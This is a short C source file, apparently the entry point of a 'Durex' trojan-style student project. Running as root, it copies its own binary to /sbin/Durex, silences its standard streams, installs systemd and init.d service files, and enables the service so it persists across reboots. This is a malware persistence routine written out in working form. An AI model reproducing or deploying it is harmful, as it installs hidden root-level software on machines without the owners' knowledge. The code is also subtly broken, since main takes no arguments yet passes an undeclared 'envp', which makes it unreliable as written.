#include "durex.h"

int		main(void)
{
	char buf[255];
	char buff[300];

	memset(&buf, 0, 255);
	if(geteuid() != 0)
		return (1);
	readlink("/proc/self/exe", buf, 255);
	snprintf(buff, 300, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
	{
		printf("maabou-h\n");
		close(0);
		close(1);
		close(2);
		if (system(buff) != 0)
			return (1);
		if (system("cp ./Durex.service /etc/systemd/system/Durex.service && chmod u+x /etc/systemd/system/Durex.service") != 0)
			return (1);
		if (system("cp ./Durex.init /etc/init.d/Durex && chmod u+x /etc/init.d/Durex") != 0)
			return (1);
		system("systemctl -q daemon-reload; systemctl -q enable Durex; service Durex restart");
		return (0);
	}
	else
		_rundurex(envp);
	return 0;
}
